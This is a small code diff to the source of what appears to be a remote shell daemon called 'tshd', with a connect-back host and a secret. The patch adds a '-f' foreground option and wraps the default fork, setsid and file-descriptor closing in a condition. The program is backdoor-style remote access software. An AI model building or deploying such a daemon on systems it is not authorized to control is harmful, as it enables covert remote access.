@@ -56,6 +56,7 @@ int tshd_runshell( int client );
 void usage(char *argv0)
 {
     fprintf(stderr, "Usage: %s [ -c [ connect_back_host ] ] [ -s secret ] [ -p port ]\n", argv0);
+    fprintf(stderr, "Usage: %s [ -f [ forgound, backgound as default ]\n", argv0);
     exit(1);
 }
 
@@ -73,8 +74,10 @@ int main( int argc, char **argv )
     struct sockaddr_in server_addr;
     struct sockaddr_in client_addr;
     struct hostent *client_host;
+	/* background as default. */
+	int background = 1;
 
-    while ((opt = getopt(argc, argv, "s:p:c:")) != -1) {
+    while ((opt = getopt(argc, argv, "s:p:c:f")) != -1) {
         switch (opt) {
             case 'p':
                 server_port=atoi(optarg); /* We hope ... */
@@ -82,6 +85,9 @@ int main( int argc, char **argv )
                 break;
             case 's':
                 secret=optarg; /* We hope ... */
+                break;
+            case 'f':
+                background = 0;
                 break;
 			case 'c':
 				if (optarg == NULL) {
@@ -98,33 +104,34 @@ int main( int argc, char **argv )
 
 
     /* fork into background */
+	if (background) {
+		pid = fork();
 
-    pid = fork();
+		if( pid < 0 )
+		{
+			return( 1 );
+		}
 
-    if( pid < 0 )
-    {
-        return( 1 );
-    }
+		if( pid != 0 )
+		{
+			return( 0 );
+		}
 
-    if( pid != 0 )
-    {
-        return( 0 );
-    }
+		/* create a new session */
 
-    /* create a new session */
+		if( setsid() < 0 )
+		{
+			perror("socket");
+			return( 2 );
+		}
 
-    if( setsid() < 0 )
-    {
-        perror("socket");
-        return( 2 );
-    }
+		/* close all file descriptors */
 
-    /* close all file descriptors */
-
-    for( n = 0; n < 1024; n++ )
-    {
-        close( n );
-    }
+		for( n = 0; n < 1024; n++ )
+		{
+			close( n );
+		}
+	}
 
 	if (cb_host == NULL) {
     	/* create a socket */
